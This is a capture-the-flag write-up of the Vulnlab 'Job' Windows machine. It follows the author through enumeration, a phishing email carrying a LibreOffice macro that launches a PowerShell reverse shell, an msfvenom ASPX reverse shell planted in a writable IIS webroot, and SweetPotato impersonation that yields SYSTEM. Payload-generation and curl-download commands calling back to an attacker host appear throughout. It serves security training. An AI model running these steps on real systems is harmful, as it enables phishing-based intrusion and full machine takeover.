---
title: Job - Vulnlab
date: 2024-07-14 14:19:34
tags: [vulnlab, Medium]
categories: vulnlab
keywords: 'Vulnlab, Medium, Windows'
description: Job is one of the older machines from Vulnlab that consisted of tactics generally seen on the OSCP. This is great practice for the exam, and involves LibreOffice macros in email servers along with an interesting privilege escalation path. I'll try to avoid using C2's for this machine just to stay in-line with OSCP rules.
cover: /images/vulnlab/job-vl/job_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

Job is one of the older machines from Vulnlab that consisted of tactics generally seen on the OSCP. This is great practice for the exam, and involves LibreOffice macros in email servers along with an interesting privilege escalation path. I'll try to avoid using C2's for this machine just to stay in-line with OSCP rules.

# Enumeration

So let's first start with our NMAP scan. Our entry point for this machine is `10.10.105.93`.

```
└─$ sudo nmap 10.10.105.93
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 12:50 EDT
Nmap scan report for 10.10.105.93
Host is up (0.11s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 18.62 seconds
```

It looks to be a Windows machine that is not a DC, so we can assume that it is a workstation. There seems to be an email service along with a website, so we can potentially look to those first for our initial foothold.

Just for a service test, I also ran a test against SMB to see if null authentication was enabled.

```
└─$ smbclient -L 10.10.105.93 -N         
session setup failed: NT_STATUS_ACCESS_DENIED
```

It seems that the entry point will most definitely be through either the SMTP server or through the web server. Let's take a look at the website first to see if there are any leads to exploit.

![](/images/vulnlab/job-vl/b.png)

The website looks to be a job application frontpage calling for developer applications. The message from the front seems to give us a potential email for our attack path, `career@job.local`. Furthermore, the page tells us to send our CV as a LibreOffice document.

There doesn't seem to be much here aside from this page, I made sure to run a VHOST scan for other subdomains and a directory enumeration scan - though I came back with nothing.

Looking at SMTP, it seems as though the server seems to have open relay enabled.

```
└─$ telnet 10.10.105.93 25
Trying 10.10.105.93...
Connected to 10.10.105.93.
Escape character is '^]'.
220 JOB ESMTP
HELP
211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```

# LibreOffice Macro RCE

At this point, the attack path is relatively clear. Assuming that we have nothing else to exploit on the webpage aside from the email, it seems that SMTP is the main part of the attack path. We have an email that we can send documents to, so the first part of this should be phishing.

Given what the webpage is telling us, it should only be accepting LibreOffice documents with a `.odt` extension. I'm assuming that the backend (since this is a lab) is going to immediately open our document when we send it to view its contents.

This phishing portion is an exploit directly targeted at LibreOffice - as you can essentially get RCE directly from a LibreOffice macro. Macros can be used to run shell commands directly upon opening the LibreOffice document, and are one of the (if not, the most) commonly seen vulnerability in LibreOffice.

We can set up LibreOffice Writer locally to create this macro, to which I used my Windows host to create this. LibreOffice has been difficult to set up on my Kali host in my past experiences, so I decided to opt for my Windows machine for this. You can find the installation page [here](https://www.libreoffice.org/get-help/install-howto/).

Once everything is installed and ready to go, we should be able to open our LibreOffice Writer editor.

![](/images/vulnlab/job-vl/c.png)

I made a short cover letter that is mostly fake, just to have some fun with this lab. I also saved this as a `.odt` file named `daz_smith_CV.odt`. 

The front text doesn't really matter as to what we put on it, as the main part of this exploit consists within the `Macros` section of LibreOffice.

You can access this by going to `Tools > Macros > Organize Macros > Macros`. Select on the name of your document and click on `New`. We'll name this macro `AO` for "AutoOpen".

![](/images/vulnlab/job-vl/d.png)

This will spawn a LibreOffice Basic editor with your macro pane on the right side of the application. The foundation for our macro is ready, all we need to do is create a Shell macro so that LibreOffice can execute commands from this macro.

This forum page details how we can set up shell macros, they are relatively simple and involve wrapping our commands inside a `Shell()` call. We'll also be looking to execute a reverse shell, to which I opted to use a Base64 encoded Powershell reverse shell crafted from [revshells.com](https://www.revshells.com/).

![](/images/vulnlab/job-vl/e.png)

In order to make this macro execute upon opening the document, we'll need to set the AutoOpen feature to open this document automatically. We can access this (from the LibreOffice Writer window, not the Macro window) in `Tools > Customize`. Select `OpenDocument` from the `Events` list and select the macro that we just created.

From here, our document should be ready to exploit. You can test that this works by reopening the document, and a PowerShell pane should be seen briefly as soon as you open it. Since we're on our Windows host and don't have a listener running, this won't do anything - though you'll know that it should be working.

With that, we'll transfer this back to our Kali system and set up a netcat listener on the port that our PowerShell reverse shell going to call back to. In my case, I'll do `nc -lvnp 9001`.

We'll now need a way to send this through SMTP, which can be trivial dependent on the tools you have access to. By default, the most up-to-date version of Kali should have the `sendemail` tool installed - which makes emails submitted through SMTP easy to submit. You could also opt to use `swaks`, though I could not seem to get that tool working on my end.

```
└─$ sendemail -s job.local -f "daz <daz@daz.daz>" -t career@job.local -o tls=no -m "Please see the attached for my cover letter. \n\nV/R.,\n\nDaZ Smith" -a daz_smith_CV.odt
```

I also made sure to set `job.local` to our IP address of `10.10.105.93` just so that it can resolve properly to the workstation. Let's send our email and wait for a result on our listener.

After a few seconds, we should get a shell back as `jack.black`.

![](/images/vulnlab/job-vl/f.png)

The user flag is within the users `Desktop` directory, meaning we have compromised the first half of this machine.

# Privilege Escalation Through Writable Directories

At this point, given that we are not within an AD environment - I would assume that the next part of privilege escalation would either be credential hunting or internal application exploitation.

There doesn't seem to be much for the `jack.black` user in their home directory (nor any cached credentials in their home folder), and they do not seem to have any notable privileges on this workstation.

```
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

I checked the `C:\` root directory and it seems that the web server itself is being hosted within the `inetpub` page. I have confirmed that this is the website as the `index.html` page within `wwwroot` seems to be identical to the webpage we visited at the start of this machine.

I did however notice that we have write access to this directory upon uploading a simple `test.txt` file.

```
PS C:\inetpub\wwwroot> echo "test" > test.txt
PS C:\inetpub\wwwroot> ls

Directory: C:\inetpub\wwwroot

Mode                 LastWriteTime         Length Name                   
----                 -------------         ------ ----                   
d-----        11/10/2021   8:52 PM                aspnet_client          
d-----         11/9/2021   9:24 PM                assets                 
d-----         11/9/2021   9:24 PM                css                    
d-----         11/9/2021   9:24 PM                js                     
-a----        11/10/2021   9:01 PM            298 hello.aspx             
-a----         11/7/2021   1:05 PM           3261 index.html             
-a----         7/14/2024   5:57 PM             14 test.txt
```

This website seems to also be running through Windows IIS, and a simple `hello.aspx` file is being hosted on the webserver as well.

```ASPX
PS C:\inetpub\wwwroot> cat hello.aspx
<%@ Page Language="c#" AutoEventWireup="false" CodeBehind="Default.aspx.vb" %>
<html xmlns="www.w3.org/1999/xhtml">
<head runat="server">
        <title></title>
</head>
<body>
        <form id="form1" runat="server">
        <div>

        <%Response. Write( "Hello World"); %>

        </div>
        </form>
</body>
</html>
```

Browsing to this on the website, it seems that all this code is doing is printing out `Hello World` to the web page.

![](/images/vulnlab/job-vl/g.png)

I've dealt with IIS websites before, and I do recall that most exploits (or at least RCE) involve some form of ASPX or ASP reverse shell. Given that we have write access to the web application's home directory, I'm assuming that we can simply just generate one and potentially get a callback as the backend user.

We'll generate an ASPX reverse shell with `msfvenom`.

```
└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f aspx LHOST=10.8.0.173 LPORT=9002 > daz.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3415 bytes
```

We'll then transfer it to the local machine in the `wwwroot` directory, we can do this simply with a Python server - `python3 -m http.server 9005`.

```
PS C:\inetpub\wwwroot> curl http://10.8.0.173:9005/daz.aspx -O daz.aspx
PS C:\inetpub\wwwroot> ls

Directory: C:\inetpub\wwwroot

Mode                 LastWriteTime         Length Name                   
----                 -------------         ------ ----                   
d-----        11/10/2021   8:52 PM                aspnet_client          
d-----         11/9/2021   9:24 PM                assets                 
d-----         11/9/2021   9:24 PM                css                    
d-----         11/9/2021   9:24 PM                js                     
-a----         7/14/2024   6:03 PM           3415 daz.aspx               
-a----        11/10/2021   9:01 PM            298 hello.aspx             
-a----         11/7/2021   1:05 PM           3261 index.html             
-a----         7/14/2024   5:57 PM             14 test.txt
```

We'll then set up another listener on `nc -lvnp 9002` based on our `msfvenom` payload and browse to the file on the webpage.

![](/images/vulnlab/job-vl/h.png)

As you can see, our listener called back and we received a new shell as `defaultapppool`.

# Exploiting SeImpersonatePrivilege

Upon checking our privileges as this user, it seems that we have `SeImpersonatePrivilege` set.

```
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I've exploited this privilege several times before, and the end result should be no different here. I'll give a short snippet as to how this command works with the service account that we currently have access to.

Service accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.

We can impersonate SYSTEM and authenticate to an evil named pipe that we create. We'll then direct this named pipe to a binary to execute, which will run in the context of SYSTEM.

I ran a simple test to see if AV was enabled on this machine, and it seems that it is not.

```
PS C:\windows\system32\inetsrv> "Invoke-Mimikatz"
"Invoke-Mimikatz"
Invoke-Mimikatz
```

In that case, we should be able to use [SweetPotato](https://github.com/CCob/SweetPotato) to generate this authentication coercion from SYSTEM. Had Defender been enabled, I would have used the loader that I had used in Breach to execute this application in memory. You can download a precompiled version of `SweetPotato` through the GitHub repository, or compile the source code with Visual Studio.

We'll then generate a new powershell executable payload with `msfvenom`, as seen below.

```
└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 > daz.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

We can then upload both `SweetPotato` and our `msfvenom` reverse shell to the machine using our Python server. We can then start up our netcat listener on port `9003` as seen from our payload attributes above. (`nc -lvnp 9003`)

```
PS C:\temp> curl http://10.8.0.173:9001/SweetPotato.exe -O SweetPotato.exe
PS C:\temp> curl http://10.8.0.173:9001/daz.exe -O daz.exe
PS C:\temp> ls

Directory: C:\temp

Mode                 LastWriteTime         Length Name                                                 
----                 -------------         ------ ----                                                 
-a----         7/14/2024   6:14 PM           7168 daz.exe                                              
-a----         7/14/2024   6:13 PM         926208 SweetPotato.exe
```

Now that everything is set up, we'll run `SweetPotato` and point it to execute `PowerShell` on an evil-named pipe that points to our reverse shell.

```
PS C:\temp> .\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a 'C:\temp\daz.exe' -e EfsRpc
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method EfsRpc to launch C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[+] Triggering name pipe access on evil PIPE \\localhost/pipe/cb0eb314-002c-4c3d-9139-361e75c14e29/\cb0eb314-002c-4c3d-9139-361e75c14e29\cb0eb314-002c-4c3d-9139-361e75c14e29
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
```

If we look back at our third netcat listener, we'll see that a successful session was spawned as `SYSTEM`.

```
└─$ nc -lvnp 9003               
listening on [any] 9003 ...
connect to [10.8.0.173] from (UNKNOWN) [10.10.105.93] 53394
Microsoft Windows [Version 10.0.20348.350]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Now that we have a shell as `SYSTEM`, we have successfully compromised this machine and can read the root flag underneath `C:\Users\Administrator\Desktop\root.txt`!

# Conclusion

This box tested some knowledge of previous machines that I had done before, notably `SeImpersonatePrivilege` along with IIS exploitation through ASPX reverse shells. The LibreOffice exploitation was new, however I have set up VBA macros in the past so it was helpful to strengthen those skills.

Big thanks to xct for the development of this machine.

# Resources

https://www.libreoffice.org/get-help/install-howto/
https://ask.libreoffice.org/t/how-to-use-shell-from-basic-macro-solved/23590
https://www.revshells.com/
https://github.com/CCob/SweetPotato